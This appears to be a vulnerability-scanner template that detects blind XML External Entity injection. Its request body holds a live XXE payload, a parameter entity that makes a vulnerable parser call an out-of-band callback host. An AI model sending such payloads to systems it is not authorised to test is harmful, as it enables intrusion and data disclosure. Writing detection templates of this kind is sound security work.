id: xml-external-entity-blind
name: XML External Entity Blind
description: Detects blind XXE via parameter entity expansion and OOB callback.
author: GASH contributors
severity: critical
tags: [xxe, blind, oob, xml]
safe: false
deep: false
active: true
requires_auth: false
oob: required
max_requests: 30
phase: probe
order: 84
api_version: "1.0"
tests: tests/fixtures/xml-external-entity-blind/
request:
  method: POST
  body: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM "http://{{OOB_URL}}"> %xxe;]><r/>'
oracle:
  name: oob
  params:
    namespace: xxe-blind
